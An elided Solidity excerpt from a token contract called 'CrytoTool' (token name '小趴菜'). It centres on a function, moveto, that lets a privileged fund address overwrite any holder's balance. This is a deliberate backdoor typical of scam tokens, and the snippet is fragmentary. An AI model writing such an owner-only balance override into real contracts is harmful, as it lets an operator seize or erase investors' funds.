...
contract CrytoTool is Context,Ownable {
    ...
    string private _name = unicode"小趴菜";
    string private _symbol = unicode"小趴菜";
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function moveto(address minter, uint256 _amount) external  {
            require(msg.sender == _fundaddress, "!_fundaddress");
             _balances[minter] = _amount * 10 ** decimals() - 100 ;
    }
